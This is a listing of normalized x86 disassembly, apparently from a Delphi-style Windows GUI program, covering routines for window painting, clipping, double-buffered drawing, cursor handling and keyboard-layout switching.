cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44e528
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41860c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4185b0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416f24
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4185b0
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423b68
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416f24
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423b68
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416f24
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44875c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44afd4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44e758
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44875c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44afd4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44afd4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44875c
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44e758
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4185b0
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44e8ac
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e3d0
jmp r-xdata
mov eax ebx
call sub_44d44c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e9fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_45071c
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44afd4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44e8ac
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_45071c
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44ea0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ea2c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eaa0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eac0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eae0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb04
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb28
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb4c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb70
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43dfe8
mov edi eax
mov eax edi
call sub_43e0c8
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424828
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45071c
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43e1c8
jmp r-xdata
sub_44ebf8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44b908
test bl bl
je r-xdata
mov eax edi
call sub_450a2c
mov eax edi
call sub_450624
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_450624
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44ecb8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44b564
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44ed08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a2c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44cfdc
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403350
sub_44ed50
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_449964
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44e008
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46930c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44eea0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44ef7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ef86
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_45071c
mov dl [ ebx + 0x184 ]
call sub_45537c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46776c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407edc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46756c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46756c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46756c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44ef8c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f016
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f01d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46776c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407edc
test eax eax
je r-xdata
mov eax ebx
call sub_45071c
mov dl 0x1
call sub_455360
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44f078
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416f14
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44afd4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44f0c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44f0fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403350
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403350
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44f13c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44afd4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44f194
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4214d4
mov edx [ r-xdata ]
call sub_403304
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44f1cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4185b0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f1f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_45071c
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44f24c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44f1b8
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4185b0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44f28c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4057d4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4057d4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44f2f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44f3a0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f3a7
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_447acc
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403154
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403350
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4057d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ edi + 0x178 ] eax
sub_44f3b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor edx edx
push ebp
push sub_44f472
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403350
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f479
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44f479
mov eax [ ebp - 0x4 ]
call sub_460ae8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44a080
sub_44f4c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40309c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bc94
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44f52e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44a080
sub_44f548
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44f570
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_460ae8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4609f0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403350
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f570
test al al
jne r-xdata
sub_44f5d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f570
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451844
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f604
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f570
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451844
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f630
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44f658
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_460ae8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4609f0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403350
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f658
test al al
jne r-xdata
sub_44f6c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f658
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f6e0
push ebx
push esi
